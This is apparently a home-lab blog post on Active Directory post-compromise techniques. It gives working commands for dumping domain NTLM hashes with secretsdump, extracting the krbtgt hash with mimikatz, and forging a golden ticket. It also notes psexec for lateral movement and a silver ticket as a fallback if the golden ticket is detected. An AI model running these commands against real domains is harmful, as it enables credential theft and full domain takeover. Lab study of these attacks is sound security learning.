---
layout: single
title: "Post-Domain Compromise"
date: 2024-09-28
categories:
  - Active Directory
tags:
  - AD
  - Post-Compromise
permalink: /projects/ad-hacking-home-lab/post-domain-compromise/
order: 4
---

- Dump the NTLM.dir file using secretsdump then crack the passwords afterwards.

```bash
#The ip is of the DC cuz we're admins
secretsdump.py RACCOON.local/lkennedy:'Password1@'@192.168.52.138 -just-dc-ntlm
```

## Golden ticket attack:

- This one so far is my favorite attack!
- It consists of taking advantage of the “krbtgt” account and pass the ticket to gain access through the whole Domain Controller users and computers.
- We need to use mimikatze in a DC using a domain admin.
- Open cmd as administrator, run mimikatze then type the commands below:

```bash
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

- That is going to dump a bunch of informations about that user but we’ll only need the sid and the ntlm hash.

```powershell
kerberos::golden /User:Administrator /domain:raccoon.local /sid:S-1-5-21-909744362-4121654894-721523953 /krbtgt:6de941d21500a8b8a8283cc1143b2b69 /id:500 /ptt
```

![AD-PD-01](/assets/images/AD-images/AD-PD-01.jpg)

- Now that the golden ticket is generated for our current session we simply type

```powershell
misc::cmd
```

- to open a new cmd, here’s an example

![AD-PD-02](/assets/images/AD-images/AD-PD-02.jpg)


- Something to note is that to create a ticket we need a valid user in the DC, this came after a recent patch or else it will not let us access the computer.
- we can also use psexec to gain access to the other computers using the golden ticket.
- If the golden ticket is picked up then use the silver ticket.